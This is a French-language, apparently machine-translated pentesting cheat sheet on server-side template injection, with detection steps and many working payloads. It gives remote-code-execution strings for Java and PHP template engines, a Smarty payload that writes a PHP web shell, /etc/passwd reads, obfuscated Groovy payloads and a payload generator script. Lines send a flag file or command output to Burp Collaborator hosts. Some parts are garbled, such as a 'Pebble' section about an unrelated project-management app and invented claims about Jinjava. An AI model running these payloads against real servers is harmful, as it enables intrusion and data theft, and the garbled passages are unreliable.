# SSTI (Injection de mod√®le c√¥t√© serveur)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Qu'est-ce que l'injection de mod√®le c√¥t√© serveur ?

Une injection de mod√®le c√¥t√© serveur se produit lorsqu'un attaquant est capable d'utiliser la syntaxe de mod√®le native pour injecter une charge utile malveillante dans un mod√®le, qui est ensuite ex√©cut√© c√¥t√© serveur.

Les **moteurs de mod√®le** sont con√ßus pour **g√©n√©rer des pages web** en **combinant** des mod√®les **fixes** avec des donn√©es **volatiles**. Les attaques d'injection de mod√®le c√¥t√© serveur peuvent se produire lorsque l'**entr√©e utilisateur** est concat√©n√©e directement **dans un mod√®le**, plut√¥t que transmise en tant que donn√©es. Cela permet aux attaquants d'**injecter des directives de mod√®le arbitraires** afin de manipuler le moteur de mod√®le, leur permettant souvent de prendre **le contr√¥le complet du serveur**.

Un exemple de code vuln√©rable est le suivant :
```php
$output = $twig->render("Dear " . $_GET['name']);
```
Dans l'exemple pr√©c√©dent, **une partie du mod√®le** est elle-m√™me **g√©n√©r√©e dynamiquement** en utilisant le param√®tre `GET` `name`. Comme la syntaxe du mod√®le est √©valu√©e c√¥t√© serveur, cela permet potentiellement √† un attaquant de placer une charge utile d'injection de mod√®le c√¥t√© serveur dans le param√®tre `name` comme suit:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## Construction d'une attaque d'injection de mod√®le c√¥t√© serveur

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### D√©tecter

Comme pour toute vuln√©rabilit√©, la premi√®re √©tape vers l'exploitation est de pouvoir la trouver. Peut-√™tre la m√©thode la plus simple consiste √† essayer de **fuzzer le mod√®le** en injectant une s√©quence de caract√®res sp√©ciaux couramment utilis√©s dans les expressions de mod√®le, tels que le polyglotte **`${{<%[%'"}}%\`.**\
Afin de v√©rifier si le serveur est vuln√©rable, vous devez **rep√©rer les diff√©rences** entre la r√©ponse avec des **donn√©es r√©guli√®res** sur le param√®tre et la **charge utile donn√©e**.\
Si une **erreur est renvoy√©e**, il sera assez facile de d√©terminer que **le serveur est vuln√©rable** et m√™me quel **moteur est en cours d'ex√©cution**. Mais vous pouvez √©galement trouver un serveur vuln√©rable si vous vous y **attendiez** √† ce qu'il **refl√®te** la charge utile donn√©e et qu'il ne le fait **pas** ou s'il y a des **caract√®res manquants** dans la r√©ponse.

**D√©tecter - Contexte en texte brut**

L'entr√©e donn√©e est **rendue et refl√©t√©e** dans la r√©ponse. Cela peut facilement √™tre **confondu avec une vuln√©rabilit√©** [**XSS**](../xss-cross-site-scripting/) simple, mais il est facile de diff√©rencier si vous essayez de d√©finir des **op√©rations math√©matiques** dans une expression de mod√®le :
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**D√©tecter - Contexte de code**

Dans ces cas, l'**entr√©e utilisateur** est plac√©e **√† l'int√©rieur** d'une **expression de mod√®le** :
```python
engine.render("Hello {{"+greeting+"}}", data)
```
L'acc√®s √† l'URL de cette page pourrait √™tre similaire √† : `http://vulnerable-website.com/?greeting=data.username`

Si vous **modifiez** le param√®tre **`greeting`** pour une **valeur diff√©rente**, la **r√©ponse ne contiendra pas le nom d'utilisateur**, mais si vous acc√©dez √† quelque chose comme : `http://vulnerable-website.com/?greeting=data.username}}hello`, alors **la r√©ponse contiendra le nom d'utilisateur** (si les caract√®res d'expression de mod√®le de fermeture √©taient **`}}`**).\
Si une **erreur** est g√©n√©r√©e pendant ces tests, il sera plus facile de trouver que le serveur est vuln√©rable.

### Identifier

Une fois que vous avez d√©tect√© le potentiel d'injection de mod√®le, la prochaine √©tape consiste √† identifier le moteur de mod√®le.\
Bien qu'il existe un grand nombre de langages de mod√©lisation, beaucoup d'entre eux utilisent une syntaxe tr√®s similaire qui est sp√©cifiquement choisie pour ne pas entrer en conflit avec les caract√®res HTML.

Si vous avez de la chance, le serveur **imprimera les erreurs** et vous pourrez trouver le **moteur** utilis√© **√† l'int√©rieur** des erreurs. Certains payloads possibles qui peuvent causer des erreurs :

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

Sinon, vous devrez **tester manuellement diff√©rents payloads sp√©cifiques √† la langue** et √©tudier comment ils sont interpr√©t√©s par le moteur de mod√®le. Une fa√ßon courante de faire cela est d'injecter des op√©rations math√©matiques arbitraires en utilisant la syntaxe de diff√©rents moteurs de mod√®le. Vous pouvez ensuite observer s'ils sont √©valu√©s avec succ√®s. Pour vous aider dans ce processus, vous pouvez utiliser un arbre de d√©cision similaire √† celui-ci :

![](<../../.gitbook/assets/image (272).png>)

### Exploiter

**Lire**

La premi√®re √©tape apr√®s avoir trouv√© l'injection de mod√®le et identifi√© le moteur de mod√®le consiste √† lire la documentation. Les domaines cl√©s d'int√©r√™t sont :

* Les sections 'Pour les auteurs de mod√®les' couvrant la syntaxe de base.
* 'Consid√©rations de s√©curit√©' - il est probable que quiconque a d√©velopp√© l'application que vous testez n'a pas lu cela, et cela peut contenir des indices utiles.
* Listes de m√©thodes, fonctions, filtres et variables int√©gr√©es.
* Listes d'extensions/plugins - certaines peuvent √™tre activ√©es par d√©faut.

**Explorer**

En supposant qu'aucune exploitation ne se soit pr√©sent√©e, la prochaine √©tape consiste √† **explorer l'environnement** pour savoir exactement √† quoi **vous avez acc√®s**. Vous pouvez vous attendre √† trouver √† la fois des **objets par d√©faut** fournis par le moteur de mod√®le, et des **objets sp√©cifiques √† l'application** transmis au mod√®le par le d√©veloppeur. De nombreux syst√®mes de mod√®les exposent un objet 'self' ou un espace de noms contenant tout ce qui est en port√©e, et une fa√ßon idiomatique de lister les attributs et m√©thodes d'un objet.

S'il n'y a pas d'objet self int√©gr√©, vous devrez forcer les noms de variables en utilisant [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) et la collection de listes de mots de passe de Burp Intruder.

Les objets fournis par le d√©veloppeur sont particuli√®rement susceptibles de contenir des informations sensibles, et peuvent varier entre diff√©rents mod√®les au sein d'une application, de sorte que ce processus devrait id√©alement √™tre appliqu√© √† chaque mod√®le distinct individuellement.

**Attaquer**

√Ä ce stade, vous devriez avoir une **id√©e ferme de la surface d'attaque disponible** et √™tre en mesure de proc√©der avec les techniques d'audit de s√©curit√© traditionnelles, en examinant chaque fonction pour des vuln√©rabilit√©s exploitables. Il est important d'aborder cela dans le contexte de l'application plus large - certaines fonctions peuvent √™tre utilis√©es pour exploiter des fonctionnalit√©s sp√©cifiques √† l'application. Les exemples √† suivre utiliseront l'injection de mod√®le pour d√©clencher la cr√©ation arbitraire d'objets, la lecture/√©criture de fichiers arbitraires, l'inclusion de fichiers distants, la divulgation d'informations et les vuln√©rabilit√©s d'escalade de privil√®ges.

## Outils

### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## Exploits

### G√©n√©rique

Dans cette **liste de mots**, vous pouvez trouver les **variables d√©finies** dans les environnements de certains des moteurs mentionn√©s ci-dessous :

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - Injection de base**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - R√©cup√©rer les variables d'environnement du syst√®me**

La r√©cup√©ration des variables d'environnement du syst√®me peut √™tre utile lors de l'analyse d'une application. Les variables d'environnement peuvent contenir des informations sensibles telles que des cl√©s d'API, des noms d'utilisateur et des mots de passe. Pour r√©cup√©rer les variables d'environnement du syst√®me en Java, vous pouvez utiliser la classe `System` et la m√©thode `getenv()`. Voici un exemple de code qui r√©cup√®re toutes les variables d'environnement du syst√®me et les affiche :

```java
Map<String, String> env = System.getenv();
for (String envName : env.keySet()) {
    System.out.format("%s=%s%n", envName, env.get(envName));
}
```

Ce code r√©cup√®re toutes les variables d'environnement du syst√®me et les stocke dans une `Map`. Ensuite, il parcourt la `Map` et affiche chaque variable d'environnement avec sa valeur correspondante.
```java
${T(java.lang.System).getenv()}
```
**Java - R√©cup√©rer /etc/passwd**

Dans certaines situations, il est possible d'exploiter une injection de mod√®le c√¥t√© serveur (SSTI) pour r√©cup√©rer le fichier `/etc/passwd` sur le serveur cible. Cela peut √™tre accompli en utilisant la syntaxe de mod√®le sp√©cifique au langage pour ex√©cuter des commandes syst√®me.

Dans cet exemple, nous allons utiliser la syntaxe de mod√®le Java pour ex√©cuter la commande `cat /etc/passwd` et r√©cup√©rer le contenu du fichier.

```
${new java.util.Scanner(Runtime.getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter("\\A").next()}
```

Cette syntaxe cr√©e un objet `Scanner` qui lit le contenu de la sortie de la commande `cat /etc/passwd` √† partir d'un flux d'entr√©e. Le contenu est ensuite retourn√© en tant que cha√Æne de caract√®res.

Il est important de noter que cette technique ne fonctionnera que si l'application utilise une injection de mod√®le c√¥t√© serveur et que le serveur cible ex√©cute une version de Java qui prend en charge la syntaxe de mod√®le utilis√©e.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Vous pouvez essayer vos charges utiles sur [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Rien`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Contournement de bac √† sable**

‚ö†Ô∏è fonctionne uniquement sur les versions de Freemarker inf√©rieures √† 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Plus d'informations**

* Dans la section FreeMarker de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Plus d'informations**

* Dans la section Velocity de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf (Java)

L'expression de test typique pour SSTI est `${7*7}`. Cette expression fonctionne √©galement dans Thymeleaf. Si vous voulez r√©aliser une ex√©cution de code √† distance, vous pouvez utiliser l'une des expressions de test suivantes :

* SpringEL : `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL : `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

Cependant, comme nous l'avons mentionn√© pr√©c√©demment, les expressions ne fonctionnent que dans des attributs Thymeleaf sp√©ciaux. S'il est n√©cessaire d'utiliser une expression √† un autre endroit dans le mod√®le, Thymeleaf prend en charge l'_insertion d'expression_. Pour utiliser cette fonctionnalit√©, vous devez mettre une expression entre `[[...]]` ou `[(...)]` (choisissez l'un ou l'autre en fonction de la n√©cessit√© d'√©chapper les symboles sp√©ciaux). Par cons√©quent, une charge utile de d√©tection SSTI simple pour Thymeleaf serait `[[${7*7}]]`.

Cependant, les chances que la charge utile de d√©tection ci-dessus fonctionne sont tr√®s faibles. Les vuln√©rabilit√©s SSTI se produisent g√©n√©ralement lorsqu'un mod√®le est g√©n√©r√© dynamiquement dans le code. Thymeleaf, par d√©faut, n'autorise pas de mod√®les g√©n√©r√©s dynamiquement et tous les mod√®les doivent √™tre cr√©√©s au pr√©alable. Par cons√©quent, si un d√©veloppeur veut cr√©er un mod√®le √† partir d'une cha√Æne _√† la vol√©e_, il devra cr√©er son propre r√©solveur de mod√®le. C'est possible mais cela arrive tr√®s rarement.

Si nous examinons de plus pr√®s la documentation du moteur de mod√®le Thymeleaf, nous trouverons une fonctionnalit√© int√©ressante appel√©e _**pr√©traitement d'expression**_. Les expressions plac√©es entre deux tirets bas (`__...__`) sont pr√©trait√©es et le r√©sultat du pr√©traitement est utilis√© comme partie de l'expression pendant le traitement r√©gulier. Voici un exemple officiel de la documentation de Thymeleaf :
```java
#{selection.__${sel.code}__}
```
**Exemple vuln√©rable**
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Plus d'informations**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Framework Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Contourner les filtres**

Plusieurs expressions de variables peuvent √™tre utilis√©es, si `${...}` ne fonctionne pas, essayez `#{...}`, `*{...}`, `@{...}` ou `~{...}`.

* Lire `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Script personnalis√© pour la g√©n√©ration de payload
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Plus d'informations**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Manipulation de la vue Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Ancienne version de Pebble (< version 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
# Nouvelle version de Pebble :

## Description

Pebble est une application de gestion de projet qui permet aux utilisateurs de suivre les t√¢ches, les √©ch√©ances et les projets en cours. La derni√®re version de Pebble comprend des am√©liorations de performance et des corrections de bugs pour une exp√©rience utilisateur plus fluide.

## Nouvelles fonctionnalit√©s

- Am√©lioration de la vitesse de chargement des pages
- Correction de bugs mineurs
- Am√©lioration de l'interface utilisateur

## Comment mettre √† jour

Les utilisateurs peuvent mettre √† jour leur version de Pebble en se rendant sur le site web de l'application et en t√©l√©chargeant la derni√®re version. Les utilisateurs de Workspace peuvent √©galement mettre √† jour l'application via le Workspace App Marketplace.
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava est un moteur de template Java qui permet l'injection de code c√¥t√© serveur (SSTI). Il est utilis√© par plusieurs frameworks Java tels que JHipster, Spring Boot et Play Framework.

Pour exploiter une vuln√©rabilit√© SSTI avec Jinjava, vous devez trouver un point d'injection dans l'application Web. Cela peut √™tre un champ de formulaire, un param√®tre d'URL ou un cookie. Une fois que vous avez identifi√© le point d'injection, vous pouvez utiliser la syntaxe Jinjava pour injecter du code malveillant.

Voici un exemple de syntaxe Jinjava pour injecter du code dans une page Web :

```
{{ 7 * 7 }}
```

Cette syntaxe affichera le r√©sultat de l'op√©ration 7 * 7 sur la page Web. Cependant, vous pouvez √©galement utiliser cette syntaxe pour ex√©cuter du code malveillant, comme l'extraction de donn√©es sensibles ou l'ex√©cution de commandes syst√®me.

Pour √©viter les vuln√©rabilit√©s SSTI avec Jinjava, vous devez valider toutes les entr√©es utilisateur et √©chapper les caract√®res sp√©ciaux. Vous pouvez √©galement d√©sactiver l'√©valuation des expressions Jinjava dans les mod√®les de votre application.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava est un projet open source d√©velopp√© par Hubspot, disponible sur [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Ex√©cution de commandes**

Corrig√© par [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Plus d'informations**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* D√©limiteurs d'instructions `{% %}`
* D√©limiteurs d'expressions `{{ }}`
* D√©limiteurs de commentaires `{# #}`
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Recherchez "com.hubspot.content.hubl.context.TemplateContextRequest" et d√©couvrez le [projet Jinjava sur Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Plus d'informations**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Langage d'expression - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

EL fournit un m√©canisme important pour permettre √† la couche de pr√©sentation (pages web) de communiquer avec la logique de l'application (beans g√©r√©s). EL est utilis√© par **plusieurs technologies JavaEE**, telles que la technologie JavaServer Faces, la technologie JavaServer Pages (JSP) et l'injection de contextes et de d√©pendances pour Java EE (CDI).\
Consultez la page suivante pour en savoir plus sur l'**exploitation des interpr√©teurs EL** :

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Cette m√©thode de contournement du gestionnaire de s√©curit√© a √©t√© prise √† partir de ce [**writeup**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Plus d'informations**

* Dans la section Smarty de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Erreur`
* `{{foobar}} Rien`
```python
#Get Info
